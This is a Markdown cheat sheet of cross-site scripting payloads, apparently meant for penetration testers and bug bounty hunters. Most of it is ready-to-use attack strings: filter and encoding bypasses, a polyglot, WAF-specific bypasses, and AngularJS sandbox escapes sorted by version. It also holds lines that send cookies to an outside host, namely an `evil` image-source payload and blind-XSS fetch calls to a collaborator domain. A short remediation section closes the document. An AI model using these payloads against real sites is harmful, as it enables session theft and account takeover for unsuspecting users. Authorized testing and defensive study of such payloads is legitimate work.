# XSS

## Context-first

Always identify the injection context before trying payloads.

| Context | Example | Starter payload |
|---------|---------|-----------------|
| HTML body | `<div>INJ</div>` | `<script>alert(1)</script>`, `<svg onload=...>` |
| HTML attribute (quoted) | `<input value="INJ">` | `" onfocus=alert(1) autofocus x="` |
| HTML attribute (unquoted) | `<input value=INJ>` | `onfocus=alert(1) autofocus` |
| JS string | `var x = "INJ"` | `";alert(1);//` |
| JS template literal | `` `INJ` `` | `${alert(1)}` |
| CSS | `style="color:INJ"` | `red;background:url(javascript:...)` |
| URL attribute | `<a href="INJ">` | `javascript:alert(1)` |
| JSON embedded in script | `<script>var j={...INJ}</script>` | `</script><script>alert(1)</script>` |

## Reflected — classic

```bash
# Feed URLs + payloads to dalfox
dalfox url "https://target.com/search?q=FUZZ" --deep-domain-xss

# Or kxss + qsreplace for pre-filter
cat urls.txt | qsreplace '"><script>alert(1)</script>' | kxss
```

## DOM XSS

Sinks in JS (client-side):

- `innerHTML`, `outerHTML`, `document.write`, `insertAdjacentHTML`.
- `eval`, `setTimeout(str)`, `setInterval(str)`, `Function(str)`.
- `location`, `location.href`, `location.hash` → if re-written.
- `postMessage` handlers without origin check.
- `jQuery.html()`, `$.parseHTML()`.

Sources: `location.search`, `location.hash`, `document.referrer`, `window.name`, postMessage.

Tooling: DOM Invader (Burp), Chrome DevTools breakpoints on DOM modifications.

## mXSS (mutation)

Browser parser rewrites HTML after sanitizer runs. Sanitizers like DOMPurify have had mXSS bugs where templating re-introduces script.

Classic payload:

```
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">
```

Always test the latest DOMPurify version — older versions have many mXSS bypasses.

## CSP bypasses

Read CSP header. Common weaknesses:

- `'unsafe-inline'` + `'unsafe-eval'` → no protection.
- `script-src 'self'` + JSONP endpoint on same host → `?callback=alert(1)`.
- Allowed CDN with user-uploadable JS (old Google sites, storage.googleapis.com).
- `'strict-dynamic'` + a reflected/dangling script injection → full bypass.
- Data exfil via `img-src *` + `<img src=//evil/?=document.cookie>`.
- Missing `base-uri` → `<base href="//evil">` hijacks relative scripts.

Check [CSP Evaluator](https://csp-evaluator.withgoogle.com/).

## postMessage

```js
window.addEventListener('message', e => {
  document.getElementById('out').innerHTML = e.data;   // no origin check
});
```

Exploit: open target in iframe, `frame.postMessage('<img src=x onerror=alert(1)>','*')`.

Always test cross-origin postMessage handlers.

## Filter / blocklist bypasses

```
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
<a href="javascript:alert(1)">x</a>
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
<meter onmouseover="alert(1)"
>><marquee loop=1 width=0 onfinish=alert(1)>
```

Encoding tricks:

```
<svg/onload=&#x61;lert(1)>
<svg/onload=alert&NewLine;(1)>
<svg onload="alert&lpar;1&rpar;">
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
```

Unicode bypass:

```
†‡•＜img src=a onerror=javascript:alert('test')>…‰€
```

URL context bypass (works without `&#x09;` too):

```
javas&#x09;cript://www.google.com/%0Aalert(1)
```

XSS Polyglot:

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

Event handler fuzzing: [PortSwigger XSS cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).

## Blind XSS

Store payload; fires in admin/back-office contexts.

```html
<script src="//your-collab.oast.pro/x"></script>
<img src=x onerror="fetch('//your-collab.oast.pro/?c='+document.cookie)">
```

Self-host [xsshunter-express](https://github.com/mandatoryprogrammer/xsshunter-express) (mandatoryprogrammer) — original xsshunter.com shut down in 2023. Place payloads in:

- User profile fields, addresses, company names.
- Invoice notes, support ticket subjects.
- Referrer headers (logged in admin dashboards).
- HTTP headers reflected in admin logs.

## Impact beyond alert(1)

Don't stop at alert — demonstrate real impact:

- Cookie theft (if not `HttpOnly`).
- Session rebinding / account takeover via CSRF token theft.
- Keylogging on sensitive pages (payment, settings).
- Internal SSRF via XHR to admin APIs.

Use an exfil endpoint you control for PoC; don't mass-collect real user data.

## WAF-specific bypasses

**Kona WAF (Akamai)**

```
\');confirm(1);//
```

**ModSecurity** — repeat onerror to confuse parser:

```html
<img src=x onerror=prompt(document.domain) onerror=prompt(document.domain) onerror=prompt(document.domain)>
```

**Wordfence**

```html
<meter onmouseover="alert(1)"
'">><div><meter onmouseover="alert(1)"</div>"
>><marquee loop=1 width=0 onfinish=alert(1)>
```

**Incapsula**

```html
<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
<img/src=q onerror='new Function`al\ert\`1\``'>
```

## Markdown / markup XSS

Works in Markdown renderers that don't strip `javascript:` hrefs:

```md
[a](javascript:confirm(1))
[a](javascript://www.google.com%0Aprompt(1))
[a](javascript://%0d%0aconfirm(1))
[a](javascript:window.onerror=confirm;throw%201)
[a]: (javascript:prompt(1))
```

RubyDoc (.rdoc):

```rdoc
XSS[JavaScript:alert(1)]
```

Textile:

```textile
"Test link":javascript:alert(1)
```

reStructuredText:

```rst
`Test link`__.

__ javascript:alert(document.domain)
```

## AngularJS sandbox escapes (by version)

Check `angular.version` in the browser console to confirm version.

**1.0.1 – 1.1.5**

```js
{{constructor.constructor('alert(1)')()}}
```

**1.2.0 – 1.2.1**

```js
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
```

**1.2.6 – 1.2.18**

```js
{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
```

**1.2.19 – 1.2.23**

```js
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
```

**1.2.24 – 1.2.29**

```js
{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
```

**1.3.1 – 1.3.2**

```js
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=''.valueOf;$eval('x=alert(1)//');}}
```

**1.3.3 – 1.3.18**

```js
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');}}
```

**1.3.20**

```js
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
```

**1.4.0 – 1.4.9**

```js
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
```

**1.5.0 – 1.5.8**

```js
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
```

**1.6.0+ (no sandbox)**

```js
{{constructor.constructor('alert(1)')()}}
```

## Flash SWF XSS (legacy, Flash EOL 2020)

Still relevant for old intranet apps and legacy bug bounty programs:

- `ZeroClipboard.swf?id=\"))}catch(e){confirm(/XSS./.source);}//&width=500&height=500&.swf`
- `plupload.flash.swf?%#target%g=alert&uid%g=XSS&`
- `flashmediaelement.swf?jsinitfunctio%gn=alert\`1\``
- `video-js.swf?readyFunction=confirm`
- `io.swf?yid=\"));}catch(e){alert(document.domain);}//`
- `banner.swf?clickTAG=javascript:alert(document.domain);//`
- `player.swf?playerready=alert(document.domain)`

## Remediation

- Output-encode per context (HTML, attr, JS, URL, CSS).
- Template engines with auto-escape (Django, Jinja2 `autoescape=True`, React JSX).
- CSP with `'strict-dynamic'` + nonces, no `unsafe-inline`.
- `HttpOnly`, `SameSite=Lax|Strict` cookies.
- `Trusted Types` policy (Chrome-based browsers).

## References

- PortSwigger — https://portswigger.net/web-security/cross-site-scripting
- OWASP XSS Cheatsheet — https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- DOMPurify — https://github.com/cure53/DOMPurify
- PayloadsAllTheThings XSS
